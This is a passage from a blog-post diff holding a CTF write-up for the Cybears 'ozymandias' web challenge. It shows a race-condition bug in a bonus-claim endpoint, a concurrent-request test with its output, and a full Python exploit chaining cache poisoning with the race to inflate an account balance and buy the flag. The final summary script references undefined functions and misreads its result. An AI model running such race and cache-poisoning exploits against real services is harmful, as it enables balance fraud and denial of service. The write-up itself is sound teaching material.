+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">user</span><span class="p">[</span><span class="s1">&#39;bonus_claimed&#39;</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;error&#39;</span><span class="p">:</span> <span class="s1">&#39;First time bonus already claimed!&#39;</span><span class="p">}),</span> <span class="mi">400</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="c1"># Interesting... why is there a sleep here?</span>
+</span></span><span class="line"><span class="cl">    <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">locations_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">conn</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;update users set balance = balance + 10.0, bonus_claimed = TRUE where id = ? &#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">],))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">conn</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span></span></span></code></pre></div></div>
+<p><strong>Spotting the Vulnerability:</strong></p>
+<p>Notice the pattern:</p>
+<ol>
+<li><strong>CHECK</strong> if <code>bonus_claimed</code> is False</li>
+<li><strong>SLEEP</strong> for 1 second</li>
+<li><strong>UPDATE</strong> balance and set <code>bonus_claimed = TRUE</code></li>
+</ol>
+<p>This sleep creates a suspicious gap between the check and the update. What if we send multiple requests during this window?</p>
+<p><strong>Testing for Race Condition:</strong></p>
+<p>Let&rsquo;s write a simple test to verify if this is exploitable:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">claim_bonus</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;location&#34;</span><span class="p">:</span> <span class="s2">&#34;US-NYC&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/claim-bonus&#34;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Response: </span><span class="si">{</span><span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">, Balance: </span><span class="si">{</span><span class="n">resp</span><span class="o">.</span><span class="n">json</span><span class="p">()</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;new_balance&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Send 3 concurrent requests</span>
+</span></span><span class="line"><span class="cl"><span class="n">threads</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">claim_bonus</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">threads</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">t</span><span class="o">.</span><span class="n">join</span><span class="p">()</span></span></span></code></pre></div></div>
+<p>Running this test after cache poisoning:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>Response: 200, Balance: 10.0
+Response: 200, Balance: 20.0
+Response: 200, Balance: 30.0</code></pre></div>
+<p>Bingo! All three requests succeeded. This is a classic <strong>Time-of-Check to Time-of-Use (TOCTOU)</strong> vulnerability. Multiple concurrent requests all pass the check in step 1 before any of them reaches step 3!</p>
+<p><strong>Why Does This Happen?</strong></p>
+<p>The check and update are not atomic. Compare this to the safe version in the normal flow:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">cur</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    UPDATE users
+</span></span></span><span class="line"><span class="cl"><span class="s1">    SET balance = balance + 10.0,
+</span></span></span><span class="line"><span class="cl"><span class="s1">        bonus_claimed = TRUE
+</span></span></span><span class="line"><span class="cl"><span class="s1">    WHERE id = ?
+</span></span></span><span class="line"><span class="cl"><span class="s1">    AND bonus_claimed = FALSE
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &#39;&#39;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">],)</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">cur</span><span class="o">.</span><span class="n">rowcount</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;error&#39;</span><span class="p">:</span> <span class="s1">&#39;First time bonus already claimed!&#39;</span><span class="p">}),</span> <span class="mi">400</span></span></span></code></pre></div></div>
+<p>This uses an <strong>atomic UPDATE with WHERE condition</strong> at the database level. Only one request can successfully update when <code>bonus_claimed = FALSE</code>, and subsequent requests will have <code>rowcount == 0</code>.</p>
+<p>The vulnerable 503 path lacks this protection, making it exploitable through concurrent requests.</p>
+<hr>
+<h2 id="the-path-to-the-flag">The Path to the Flag</h2>
+<p>Now that we&rsquo;ve identified and tested both vulnerabilities, let&rsquo;s chain them together for the complete exploit.</p>
+<p><strong>The Strategy:</strong></p>
+<ul>
+<li>Need $99.99 for the Heisenberg flag</li>
+<li>Each bonus claim gives $10</li>
+<li>With the race condition, we can claim the bonus ~10 times</li>
+<li>Cache poisoning enables the vulnerable 503 code path</li>
+</ul>
+<h3 id="building-the-full-exploit">Building the Full Exploit</h3>
+<h3 id="building-the-full-exploit-1">Building the Full Exploit</h3>
+<p>Here&rsquo;s the complete exploit code:</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">concurrent.futures</span> <span class="kn">import</span> <span class="n">ThreadPoolExecutor</span><span class="p">,</span> <span class="n">as_completed</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">uuid</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">base_url</span> <span class="o">=</span> <span class="s2">&#34;https://ozymandias.ctf.clawtheflag.com&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">username</span> <span class="o">=</span> <span class="s2">&#34;exploit_&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())[:</span><span class="mi">8</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">email</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">@test.com&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">register_user</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;email&#34;</span><span class="p">:</span> <span class="n">email</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="s2">&#34;test1234&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;confirm_password&#34;</span><span class="p">:</span> <span class="s2">&#34;test1234&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/register&#34;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Registered user: </span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="p">,</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">poison_the_cache</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;python-requests/2.32.2&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;X-Region&#34;</span><span class="p">:</span> <span class="s2">&#34;RU-MOW&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/static/js/locations.js?u=</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                      <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Cache poisoning: </span><span class="si">{</span><span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="p">,</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_bonus</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;location&#34;</span><span class="p">:</span> <span class="s2">&#34;US-NYC&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/claim-bonus&#34;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="p">,</span> <span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">batch_get_bonus</span><span class="p">(</span><span class="n">max_workers</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="mi">10</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">results</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">ThreadPoolExecutor</span><span class="p">(</span><span class="n">max_workers</span><span class="o">=</span><span class="n">max_workers</span><span class="p">)</span> <span class="k">as</span> <span class="n">executor</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">futures</span> <span class="o">=</span> <span class="p">[</span><span class="n">executor</span><span class="o">.</span><span class="n">submit</span><span class="p">(</span><span class="n">get_bonus</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">count</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">future</span> <span class="ow">in</span> <span class="n">as_completed</span><span class="p">(</span><span class="n">futures</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">results</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">future</span><span class="o">.</span><span class="n">result</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">results</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_flag</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;flag_id&#34;</span><span class="p">:</span> <span class="s2">&#34;heisenberg&#34;</span><span class="p">,</span> <span class="s2">&#34;location&#34;</span><span class="p">:</span> <span class="s2">&#34;anywhere&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">/purchase&#34;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">resp</span><span class="o">.</span><span class="n">json</span><span class="p">()</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;flag&#39;</span><span class="p">,</span> <span class="s1">&#39;No flag received&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Starting exploit...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">register_user</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="n">poison_the_cache</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">res</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">503</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] Cache poisoning failed, exiting.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Cache poisoned successfully!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Exploiting race condition...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">results</span> <span class="o">=</span> <span class="n">batch_get_bonus</span><span class="p">(</span><span class="n">max_workers</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">successful</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">(</span><span class="mi">1</span> <span class="k">for</span> <span class="n">status</span><span class="p">,</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">results</span> <span class="k">if</span> <span class="n">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] Successfully claimed bonus </span><span class="si">{</span><span class="n">successful</span><span class="si">}</span><span class="s2"> times&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Purchasing Heisenberg flag...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="n">get_flag</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[+] FLAG: </span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span></span></span></code></pre></div></div>
+<h3 id="flag">Flag</h3>
+<p><strong><code>Cybears{cache_poisoning_to_dos_to_race_condition_to_win}</code></strong></p>
+<hr>
+<h2 id="summary-of-the-complete-exploit-chain">Summary of the Complete Exploit Chain</h2>
+<p>Here&rsquo;s the final exploit code that chains everything together:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">concurrent.futures</span> <span class="kn">import</span> <span class="n">ThreadPoolExecutor</span><span class="p">,</span> <span class="n">as_completed</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">uuid</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">base_url</span> <span class="o">=</span> <span class="s2">&#34;https://ozymandias.ctf.clawtheflag.com&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">username</span> <span class="o">=</span> <span class="s2">&#34;fodhil22&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">email</span> <span class="o">=</span> <span class="s2">&#34;test@gmail.com&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Step 1: Register user</span>
+</span></span><span class="line"><span class="cl"><span class="n">register_user</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Step 2: Poison the cache</span>
+</span></span><span class="line"><span class="cl"><span class="n">res</span> <span class="o">=</span> <span class="n">poison_the_cache</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">res</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">503</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Cache poisoning failed, exiting.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Step 3: Exploit race condition</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">status</span><span class="p">,</span> <span class="n">body</span> <span class="ow">in</span> <span class="n">batch_get_bonus</span><span class="p">(</span><span class="n">max_workers</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="mi">10</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Status: </span><span class="si">{</span><span class="n">status</span><span class="si">}</span><span class="s2">, Balance updated: </span><span class="si">{</span><span class="n">body</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Step 4: Purchase the flag</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag_response</span> <span class="o">=</span> <span class="n">get_flag</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Flag: </span><span class="si">{</span><span class="n">flag_response</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span></span></span></code></pre></div></div>
+<p><strong>Execution Flow:</strong></p>
+<ol>
+<li>Creates a fresh user account</li>
+<li>Poisons the cache for this user&rsquo;s locations.js URL with the blocked region header</li>
+<li>Sends 10 concurrent bonus claim requests, exploiting the race condition</li>
+<li>Accumulates ~$100 in the account balance</li>
+<li>Purchases the Heisenberg flag and displays it!</li>
+</ol>
+<p>and gg thanks for reading hope u liked it.</p>
+<p><img
+        class="lazyload"
+        src="/blog/svg/loading.min.svg"
+        data-src="/blog/images/cybears_ctf_web_ozymandias/ozymandias.gif"
+        data-srcset="/blog/images/cybears_ctf_web_ozymandias/ozymandias.gif, /blog/images/cybears_ctf_web_ozymandias/ozymandias.gif 1.5x, /blog/images/cybears_ctf_web_ozymandias/ozymandias.gif 2x"
+        data-sizes="auto"
+        alt="/blog/images/cybears_ctf_web_ozymandias/ozymandias.gif"
+        title="ozymandias" /></p>
+<hr>
+<h2 id="key-takeaways">Key Takeaways</h2>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-12-27</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/blog/posts/cybears_ctf_web_ozymandias/" data-title="Cybears ctf web/ozymandias" data-via="Benhibafodhil" data-hashtags="ctf,web security,cybears_ctf,my_challenges"><i class="fab fa-x-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Threads" data-sharer="threads" data-url="http://localhost:1313/blog/posts/cybears_ctf_web_ozymandias/" data-title="Cybears ctf web/ozymandias"><i class="fab fa-threads fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/blog/posts/cybears_ctf_web_ozymandias/" data-hashtag="ctf"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/blog/posts/cybears_ctf_web_ozymandias/" data-title="Cybears ctf web/ozymandias"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://localhost:1313/blog/posts/cybears_ctf_web_ozymandias/" data-title="Cybears ctf web/ozymandias"><i data-svg-src="/blog/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/blog/posts/cybears_ctf_web_ozymandias/" data-title="Cybears ctf web/ozymandias"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Diaspora" data-sharer="diaspora" data-url="http://localhost:1313/blog/posts/cybears_ctf_web_ozymandias/" data-title="Cybears ctf web/ozymandias" data-description=""><i class="fab fa-diaspora fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2flocalhost%3a1313%2fblog%2fposts%2fcybears_ctf_web_ozymandias%2f&amp;text=Cybears%20ctf%20web%2fozymandias" target="_blank" title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/blog/tags/ctf/">Ctf</a>,&nbsp;<a href="/blog/tags/web-security/">Web Security</a>,&nbsp;<a href="/blog/tags/cybears_ctf/">Cybears_ctf</a>,&nbsp;<a href="/blog/tags/my_challenges/">My_challenges</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/blog/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/blog/posts/cybears_ctf_web_gear5/" class="prev" rel="prev" title="Cybears ctf web/gear5"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Cybears ctf web/gear5</a>
+            <a href="/blog/posts/cybears_ctf_web_file_manager/" class="next" rel="next" title="Cybears ctf web/file manager">Cybears ctf web/file manager<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.145.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.1-DEV"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/blog/" target="_blank">F0DH1L</a></span></div>
+        </div>
+    </footer></div>
+
